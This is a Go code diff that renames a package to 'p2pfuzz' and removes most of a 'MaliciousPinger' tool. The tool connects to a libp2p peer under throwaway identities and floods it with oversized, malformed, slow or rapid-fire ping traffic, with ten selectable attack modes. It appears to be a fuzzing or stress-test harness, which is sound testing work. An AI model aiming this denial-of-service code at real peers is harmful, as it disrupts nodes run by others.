@@ -1,4 +1,4 @@
-package resources
+package p2pfuzz
 
 import (
 	"context"
@@ -8,173 +8,9 @@ import (
 	"sync"
 	"time"
 
-	"github.com/libp2p/go-libp2p"
-	"github.com/libp2p/go-libp2p/core/crypto"
 	"github.com/libp2p/go-libp2p/core/host"
 	"github.com/libp2p/go-libp2p/core/network"
-	"github.com/libp2p/go-libp2p/core/peer"
-	"github.com/multiformats/go-multiaddr"
 )
-
-const (
-	pingProtocol = "/ipfs/ping/1.0.0"
-)
-
-type PingAttackType int
-
-const (
-	RandomPayload PingAttackType = iota
-	OversizedPayload
-	EmptyPayload
-	MultipleStreams
-	IncompleteWrite
-	PingBarrage       // New: sends many pings in rapid succession
-	MalformedPayload  // New: sends structurally invalid data
-	ConnectDisconnect // New: rapidly connects and disconnects
-	VariablePayload   // New: sends payloads of varying sizes
-	SlowWrite         // New: writes data very slowly to exhaust stream handlers
-)
-
-type MaliciousPinger struct {
-	ctx         context.Context
-	targetInfo  *peer.AddrInfo
-	running     bool
-	stopCh      chan struct{}
-	attackType  PingAttackType
-	concurrency int
-	minInterval time.Duration
-	maxInterval time.Duration
-}
-
-func NewMaliciousPinger(ctx context.Context, targetMultiaddr string) (*MaliciousPinger, error) {
-	targetAddr, err := multiaddr.NewMultiaddr(targetMultiaddr)
-	if err != nil {
-		return nil, fmt.Errorf("invalid target multiaddr: %w", err)
-	}
-
-	addrInfo, err := peer.AddrInfoFromP2pAddr(targetAddr)
-	if err != nil {
-		return nil, fmt.Errorf("failed to extract peer info from multiaddr: %w", err)
-	}
-
-	return &MaliciousPinger{
-		ctx:        ctx,
-		targetInfo: addrInfo,
-		stopCh:     make(chan struct{}),
-		attackType: RandomPayload,
-	}, nil
-}
-
-func (mp *MaliciousPinger) Start(attackType PingAttackType, concurrency int, minInterval, maxInterval time.Duration) {
-	if mp.running {
-		log.Println("Malicious ping is already running")
-		return
-	}
-
-	mp.running = true
-	mp.attackType = attackType
-	mp.concurrency = concurrency
-	mp.minInterval = minInterval
-	mp.maxInterval = maxInterval
-
-	go mp.run()
-}
-
-func (mp *MaliciousPinger) Stop() {
-	if !mp.running {
-		return
-	}
-	mp.running = false
-	mp.stopCh <- struct{}{}
-}
-
-func (mp *MaliciousPinger) IsRunning() bool {
-	return mp.running
-}
-
-func (mp *MaliciousPinger) run() {
-	var wg sync.WaitGroup
-	ticker := time.NewTicker(mp.minInterval)
-	defer ticker.Stop()
-
-	log.Printf("Starting malicious ping attack against %s with attack type %d", mp.targetInfo.ID, mp.attackType)
-
-	for mp.running {
-		select {
-		case <-mp.ctx.Done():
-			mp.running = false
-			return
-		case <-mp.stopCh:
-			return
-		case <-ticker.C:
-			for i := 0; i < mp.concurrency; i++ {
-				wg.Add(1)
-				go func() {
-					defer wg.Done()
-					if err := mp.executeAttack(); err != nil {
-						log.Printf("Error in ping attack: %v", err)
-					}
-				}()
-			}
-
-			if mp.maxInterval > mp.minInterval {
-				nextInterval := mp.minInterval + time.Duration(rand.Int63n(int64(mp.maxInterval-mp.minInterval)))
-				ticker.Reset(nextInterval)
-			}
-		}
-	}
-
-	wg.Wait()
-	log.Println("Malicious ping attack stopped")
-}
-
-func (mp *MaliciousPinger) executeAttack() error {
-	priv, _, err := crypto.GenerateKeyPair(crypto.Ed25519, -1)
-	if err != nil {
-		return fmt.Errorf("failed to generate key pair: %v", err)
-	}
-
-	h, err := libp2p.New(
-		libp2p.Identity(priv),
-		libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"),
-		libp2p.ResourceManager(&network.NullResourceManager{}),
-	)
-	if err != nil {
-		return fmt.Errorf("failed to create host: %v", err)
-	}
-	defer h.Close()
-
-	if err := h.Connect(mp.ctx, *mp.targetInfo); err != nil {
-		return fmt.Errorf("failed to connect to target: %v", err)
-	}
-
-	log.Printf("Connected to target %s for ping attack", mp.targetInfo.ID)
-
-	switch mp.attackType {
-	case RandomPayload:
-		return mp.sendRandomPingPayload(h)
-	case OversizedPayload:
-		return mp.sendOversizedPingPayload(h)
-	case EmptyPayload:
-		return mp.sendEmptyPingPayload(h)
-	case MultipleStreams:
-		return mp.openMultiplePingStreams(h)
-	case IncompleteWrite:
-		return mp.sendIncompletePingPayload(h)
-	case PingBarrage:
-		return mp.sendPingBarrage(h)
-	case MalformedPayload:
-		return mp.sendMalformedPayload(h)
-	case ConnectDisconnect:
-		return mp.performConnectDisconnect(h)
-	case VariablePayload:
-		return mp.sendVariablePayload(h)
-	case SlowWrite:
-		return mp.performSlowWrite(h)
-	default:
-		return mp.sendRandomPingPayload(h)
-	}
-}
 
 func (mp *MaliciousPinger) sendRandomPingPayload(h host.Host) error {
 	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
@@ -369,7 +205,7 @@ func (mp *MaliciousPinger) sendMalformedPayload(h host.Host) error {
 		}
 		log.Printf("Sending malformed payload: random binary garbage (%d bytes)", size)
 	case 3:
-		payload = []byte("{\"invalid\": \"json format for ping protocol\"}")
+		payload = []byte(`{"invalid": "json format for ping protocol"}`)
 		log.Printf("Sending malformed payload: invalid protocol format")
 	}
 
@@ -503,46 +339,4 @@ func (mp *MaliciousPinger) performSlowWrite(h host.Host) error {
 
 	log.Printf("Slow write completed")
 	return nil
-}
-
-func AttackTypeFromString(attackType string) PingAttackType {
-	switch attackType {
-	case "random":
-		return RandomPayload
-	case "oversized":
-		return OversizedPayload
-	case "empty":
-		return EmptyPayload
-	case "multiple":
-		return MultipleStreams
-	case "incomplete":
-		return IncompleteWrite
-	case "barrage":
-		return PingBarrage
-	case "malformed":
-		return MalformedPayload
-	case "connectdisconnect":
-		return ConnectDisconnect
-	case "variable":
-		return VariablePayload
-	case "slow":
-		return SlowWrite
-	default:
-		return RandomPayload
-	}
-}
-
-func GetAttackTypes() []string {
-	return []string{
-		"random",
-		"oversized",
-		"empty",
-		"multiple",
-		"incomplete",
-		"barrage",
-		"malformed",
-		"connectdisconnect",
-		"variable",
-		"slow",
-	}
 }
